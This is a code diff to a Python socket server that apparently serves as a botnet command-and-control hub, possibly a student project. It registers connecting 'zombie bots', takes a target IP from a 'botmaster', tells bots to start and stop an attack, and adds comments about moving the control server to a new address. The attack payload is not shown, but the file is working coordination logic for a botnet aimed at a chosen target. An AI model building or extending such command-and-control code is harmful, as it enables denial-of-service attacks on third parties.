@@ -4,6 +4,8 @@ from _thread import start_new_thread
 
 startAttack: bool = False
 ip = '127.0.0.1'
+sqlDatabaseHosts = []
+sqlDatabaseTargetIP = []
 
 
 def thread_for_botmaster(c, st):
@@ -21,6 +23,7 @@ def thread_for_botmaster(c, st):
 
     ip = str(c.recv(16).decode())
     print('received target ip=' + ip)
+    sqlDatabaseTargetIP.append(ip)
     startAttack = True
     stop = str(c.recv(1).decode())
     print("stop:" + stop)
@@ -40,6 +43,7 @@ def thread_for_zombieBot(c, addr):
                 c.send('0'.encode())
                 print('ending attack')
                 pom = 0
+                #wyślij ip nowego serwera
 
             time.sleep(1)
             continue
@@ -61,6 +65,7 @@ def thread_for_zombieBot(c, addr):
 
 
 if __name__ == '__main__':
+    x = 0
     host = '127.0.0.1'
     host = '192.168.100.11'
     port = 65432
@@ -69,7 +74,7 @@ if __name__ == '__main__':
     socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket.bind((host, port))
     socket.listen(max_connections)
-    sqlDatabase=[]
+
     try:
         while True:
             client_socket, addr = socket.accept()
@@ -77,14 +82,12 @@ if __name__ == '__main__':
             data = client_socket.recv(1).decode()  # info about which client type is connected 1-bot 2-botmaster
             if int(data) == 1:
                 print('normal bot connected')
-                sqlDatabase.append(client_socket.getpeername())
-                print(sqlDatabase)
+                sqlDatabaseHosts.append(client_socket.getpeername())
+                print(sqlDatabaseHosts)
                 start_new_thread(thread_for_zombieBot, (client_socket, addr))
             if int(data) == 2:
-
                 # todo: można zrobić jakiś proces logowania i walidacje
                 #
-                print('botmaster connected')
                 start_new_thread(thread_for_botmaster, (client_socket, addr))
             if startAttack:
                 pom = 1
@@ -92,6 +95,8 @@ if __name__ == '__main__':
 
             if not startAttack and pom == 1:
                 print("new server address")
+                #host = nowyadres
+
                 socket.detach()
                 socket.close()
 
@@ -101,4 +106,5 @@ if __name__ == '__main__':
 
                 pom = 0
     except KeyboardInterrupt:
+        print("Server is closing")
         socket.close()
